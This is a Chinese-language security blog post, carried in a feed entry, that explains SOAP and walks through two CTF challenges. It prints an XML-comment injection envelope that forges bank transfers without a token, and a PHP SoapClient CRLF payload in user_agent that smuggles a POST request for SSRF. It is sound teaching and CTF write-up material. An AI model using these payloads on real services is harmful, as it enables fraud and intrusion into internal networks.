  <entry>
    <title>SOAP及相关漏洞研究</title>
    <link href="http://skysec.top/2018/08/17/SOAP%E5%8F%8A%E7%9B%B8%E5%85%B3%E6%BC%8F%E6%B4%9E%E7%A0%94%E7%A9%B6/"/>
    <id>http://skysec.top/2018/08/17/SOAP及相关漏洞研究/</id>
    <published>2018-08-17T11:55:39.000Z</published>
    <updated>2018-10-06T03:27:58.702Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发在 https://www.anquanke.com/post/id/153065</span><br></pre></td></tr></table></figure><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>实习的时候不学点东西，和咸鱼有什么区别？<br>在看一篇writeup的时候，发现又出现了SOAP<br>感觉似曾相识，却想不起来，于是温习一波~</p><h2 id="SOAP基础知识"><a href="#SOAP基础知识" class="headerlink" title="SOAP基础知识"></a>SOAP基础知识</h2><h3 id="SOAP的基本概念"><a href="#SOAP的基本概念" class="headerlink" title="SOAP的基本概念"></a>SOAP的基本概念</h3><p>什么是SOAP？这就要从WebService说起了<br>WebService是一种跨平台，跨语言的规范，用于不同平台，不同语言开发的应用之间的交互。<br>比如在Windows Server服务器上有个C#.Net开发的应用A，在Linux上有个Java语言开发的应用B，B应用要调用A应用，或者是互相调用。用于查看对方的业务数据。这个时候，如何解决呢？<br> WebService就是出于以上类似需求而定义出来的规范：开发人员一般就是在具体平台开发webservice接口，以及调用webservice接口。每种开发语言都有自己的webservice实现框架。<br>而SOAP作为webService三要素（SOAP、WSDL(WebServicesDescriptionLanguage)、UDDI(UniversalDescriptionDiscovery andIntegration)）之一：WSDL 用来描述如何访问具体的接口， UDDI用来管理，分发，查询webService ，SOAP 可以和现存的许多因特网协议和格式结合使用，包括超文本传输协议（HTTP），简单邮件传输协议（SMTP），多用途网际邮件扩充协议（MIME）。<br><img src="/images/2018-07-25-19-58-09.png" alt=""><br>简单而言，SOAP（简单对象访问协议）是连接或Web服务或客户端和Web服务之间的接口。<br>其采用HTTP作为底层通讯协议，XML作为数据传送的格式<br>SOAP消息基本上是从发送端到接收端的单向传输，但它们常常结合起来执行类似于请求 / 应答的模式。</p><h3 id="SOAP的组成"><a href="#SOAP的组成" class="headerlink" title="SOAP的组成"></a>SOAP的组成</h3><p>一条 SOAP消息的组成：一个包含有一个必需的 SOAP 的封装包，一个可选的 SOAP 标头和一个必需的 SOAP 体块的 XML 文档。<br>SOAP消息格式：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?</span>xml</span></span><br><span class="line"><span class="php">　version=<span class="string">"1.0"</span><span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Envelope</span></span></span><br><span class="line"><span class="tag">　<span class="attr">xmlns:soap</span>=<span class="string">"http://www.w3.org/2001/12/soap-envelope"</span></span></span><br><span class="line"><span class="tag">　<span class="attr">soap:encodingStyle</span>=<span class="string">"http://www.w3.org/2001/12/soap-encoding"</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Header</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Header</span>&gt;</span></span><br><span class="line"> </span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Fault</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">soap:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>其中<br>Envelope: 标识XML文档，具有名称空间和编码详细信息。<br>Header：包含标题信息，如内容类型和字符集等。<br>Body：包含请求和响应信息。<br>Fault：错误和状态信息。<br>而关于soap的漏洞，我将用两道ctf的案例进行讲解分析</p><h2 id="SOAP漏洞利用之代码注入（一）"><a href="#SOAP漏洞利用之代码注入（一）" class="headerlink" title="SOAP漏洞利用之代码注入（一）"></a>SOAP漏洞利用之代码注入（一）</h2><p>题目如下<br><img src="/images/2018-07-25-20-13-07.jpg" alt=""><br>我们有如下功能<br>1.Profile：显示我们的当前身份和余额，每人最开始都有110元<br>2.Menu：主页面<br>3.Transfer：允许我们输入接收者ID并发送金额<br>4.VIP：需要1,000,000元才能进入该页面，应该是flag了<br>5.For Developers：告知我们api正在开发中，无法使用，但是html注释中有api的链接<br>不难看出，这是突破点，于是打开api链接后<code>api/bankservice.wsdl.php</code><br>不难提取如下两个SOAP API：<br>检查余额<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:urn</span>=<span class="string">"urn:Bank"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">urn:requestBalance</span> <span class="attr">soapenv:encodingStyle</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>wallet_num<span class="tag">&lt;/<span class="name">wallet_num</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">urn:requestBalance</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>转账交易<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:urn</span>=<span class="string">"urn:Bank"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">urn:internalTransfer</span> <span class="attr">soapenv:encodingStyle</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>receiver_wallet_num<span class="tag">&lt;/<span class="name">receiver_wallet_num</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sender_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>sender_wallet_num<span class="tag">&lt;/<span class="name">sender_wallet_num</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">amount</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:float"</span>&gt;</span>amount<span class="tag">&lt;/<span class="name">amount</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">token</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:string"</span>&gt;</span>token<span class="tag">&lt;/<span class="name">token</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">urn:internalTransfer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>一目了然，对于余额检查，输入一个钱包id即可<br>而对于转账交易，需要输入接受者、发送者、发送金额、token四个参数<br>而我们需要理由的点，也肯定是转账交易了<br>这样就可以将所有用户的初始余额汇总到我们手上，以此得到flag<br>但是问题来了，我们缺少交易的token，那么如何不需要token，即可让所有人给我们转账呢？<br>这里就用到了一些注入<br><img src="/images/2018-07-25-20-35-26.png" alt=""><br>经过插入后，代码成为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">soapenv:Envelope</span> <span class="attr">xmlns:xsi</span>=<span class="string">"http://www.w3.org/2001/XMLSchema-instance"</span> <span class="attr">xmlns:xsd</span>=<span class="string">"http://www.w3.org/2001/XMLSchema"</span> <span class="attr">xmlns:soapenv</span>=<span class="string">"http://schemas.xmlsoap.org/soap/envelope/"</span> <span class="attr">xmlns:urn</span>=<span class="string">"urn:Bank"</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Header</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;<span class="name">urn:internalTransfer</span> <span class="attr">soapenv:encodingStyle</span>=<span class="string">"http://schemas.xmlsoap.org/soap/encoding/"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">receiver_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>我们自己的id<span class="tag">&lt;/<span class="name">receiver_wallet_num</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">sender_wallet_num</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:decimal"</span>&gt;</span>其他人<span class="tag">&lt;/<span class="name">sender_wallet_num</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!--</span></span><br><span class="line"><span class="comment">        &lt;/receiver_wallet_num&gt;</span></span><br><span class="line"><span class="comment">        &lt;sender_wallet_num xsi:type="xsd:decimal"&gt;sender_wallet_num&lt;/sender_wallet_num&gt;</span></span><br><span class="line"><span class="comment">        &lt;amount xsi:type="xsd:float"&gt; </span></span><br><span class="line"><span class="comment">      --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">amount</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:float"</span>&gt;</span>750000<span class="tag">&lt;/<span class="name">amount</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">token</span> <span class="attr">xsi:type</span>=<span class="string">"xsd:string"</span>&gt;</span>token<span class="tag">&lt;/<span class="name">token</span>&gt;</span></span><br><span class="line">     <span class="tag">&lt;/<span class="name">urn:internalTransfer</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">soapenv:Body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">soapenv:Envelope</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>通过代码的拼接（有点类似于sql注入，但又不是，也是利用语句的拼接与注释），我们即可控制自己想控制的位置，已到达任意转账的目的<br><img src="/images/2018-07-25-20-35-43.jpg" alt=""><br>最后访问vip页面即可<br><img src="/images/2018-07-25-20-36-24.jpg" alt=""></p><h2 id="SOAP漏洞利用之CRLF与SSRF（二）"><a href="#SOAP漏洞利用之CRLF与SSRF（二）" class="headerlink" title="SOAP漏洞利用之CRLF与SSRF（二）"></a>SOAP漏洞利用之CRLF与SSRF（二）</h2><p>这就要从php的soap说起了，正如之前所说每种开发语言都有自己的webservice实现框架，php也不例外：<br>PHP 的 SOAP 扩展可以用来提供和使用 Web Services<br>这个扩展实现了6个类。其中有三个高级的类： SoapClient、SoapServer 和SoapFault，<br>和三个低级类，它们是 SoapHeader、SoapParam 和 SoapVar。<br>他们的关系如下：<br><img src="/images/2018-07-26-08-43-26.jpg" alt=""><br>而我们的重点利用对象当然是soapclient类<br>而为什么soapclient会有CRLF(carriage return/line feed)注入攻击问题呢？<br>这又要从soapclient的一个选项说起，我们查阅PHP手册<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> SoapClient :: SoapClient （mixed $wsdl [，<span class="keyword">array</span> $options ]）</span><br></pre></td></tr></table></figure></p><p>其中的<code>$options</code>我们跟进查看<br><img src="/images/2018-07-26-08-53-12.png" alt=""><br>其中有一个选项为<code>user_agent</code><br>可以让我们自定义<code>User-Agent</code><br>为什么要利用<code>User-Agent</code>？<br>因为http header里有一个重要的<code>Content-Type为</code>和<code>Content-Length</code><br>既然我们想要进行CRLF注入，那么势必需要控制这两项才可以实现<br>而<code>User-Agent</code>的http header位置正好在这些之上，所以可以进行覆盖<br>对于<code>Content-Type</code>，如果我们想要利用CRLF发送post请求，那么要求它为<code>application/x-www-form-urlencode</code><br>那么此时就可以利用CRLF，构造如下payload（以N1CTF的payload为例）<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$payload = <span class="keyword">new</span> SoapClient(<span class="keyword">null</span>,<span class="keyword">array</span>(<span class="string">'user_agent'</span>=&gt;<span class="string">"test\r\nCookie: PHPSESSID=08jl0ttu86a5jgda8cnhjtvq32\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length:45\r\n\r\nusername=admin&amp;password=nu1ladmin&amp;code=470837\r\n\r\n\r\n"</span>,<span class="string">'location'</span>=&gt;$location,</span><br><span class="line"><span class="string">'uri'</span>=&gt;$uri));</span><br></pre></td></tr></table></figure></p><p>即可进行CRLF攻击<br>这样的攻击有什么用？<br>我们假设我们可以从外网调用到soap的api<br>而攻击目标是在内网<br>那么就可以利用soap攻击内网，因为CRLF的原因，可以增加我们的攻击面，包括sql注入，命令执行等等<br>所以也可以说是SSRF攻击了</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><p>和许多漏洞一样，如果实现不同功能的时候，接收到不同的恶意参数，那么也会引起各种各样的攻击<br>像是实现sql查询的功能，可以引起sql注入问题<br><img src="/images/2018-07-26-09-17-38.jpg" alt=""><br><img src="/images/2018-07-26-09-17-44.jpg" alt=""><br>实现lookupDNS web服务的功能时，可引起命令注入的问题<br><img src="/images/2018-07-26-09-17-52.jpg" alt=""><br><img src="/images/2018-07-26-09-17-57.jpg" alt=""></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>soap作为重要的消息通讯连接，如果过滤或者使用不当，很容易引起许多高危攻击<br>而本人不才，可能有许多点还没注意到，如有更好的观点，还请斧正！</p><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><p><a href="https://www.cnblogs.com/kvienchen/p/8310798.html" target="_blank" rel="noopener">https://www.cnblogs.com/kvienchen/p/8310798.html</a><br><a href="http://blog.securelayer7.net/owasp-top-10-penetration-testing-soap-application-mitigation/" target="_blank" rel="noopener">http://blog.securelayer7.net/owasp-top-10-penetration-testing-soap-application-mitigation/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cla
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
      <category term="soap" scheme="http://skysec.top/tags/soap/"/>
    
  </entry>
  
</feed>
